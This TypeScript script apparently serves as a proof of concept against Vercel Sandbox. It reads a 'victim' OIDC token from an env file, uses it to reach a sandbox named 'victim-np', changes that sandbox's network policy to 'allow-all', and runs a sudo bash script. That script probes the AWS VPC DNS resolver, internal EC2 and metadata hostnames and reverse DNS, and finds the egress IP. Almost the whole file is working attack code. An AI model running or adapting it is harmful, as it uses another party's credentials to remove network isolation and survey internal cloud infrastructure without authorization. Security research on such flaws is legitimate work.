import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy before:", JSON.stringify(sbx.networkPolicy));
  console.log("updating policy to allow-all...");
  await sbx.updateNetworkPolicy("allow-all");
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== 1. resolv ==="
cat /etc/resolv.conf
echo "=== 2. DNS to VPC 172.31.0.2 (allow-all now) ==="
timeout 5 getent hosts example.com 2>&1 | head -3
echo "=== 3. dig 172.31.0.2 example.com ==="
timeout 5 dig @172.31.0.2 example.com +time=3 +tries=1 2>&1 | tail -8
echo "=== 4. internal AWS hostnames ==="
for h in ip-172-31-0-2.ec2.internal ip-172-31-16-7.ec2.internal metadata.ec2.internal compute.internal amazonaws.com s3.amazonaws.com ec2.us-east-1.amazonaws.com; do
  r=$(timeout 3 getent hosts "$h" 2>&1 | head -1)
  echo "$h -> \${r:-NOHIT}"
done
echo "=== 5. reverse dns 172.31.0.2 / 100.64.0.1 ==="
timeout 3 nslookup 172.31.0.2 2>&1 | grep -a "name = " | head -1
timeout 3 nslookup 100.64.0.1 2>&1 | grep -a "name = " | head -1
echo "=== 6. my egress IP via DNS TXT ==="
timeout 5 dig +short TXT o-o.myaddr.l.google.com 2>&1 | head -2
echo DONE
`], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
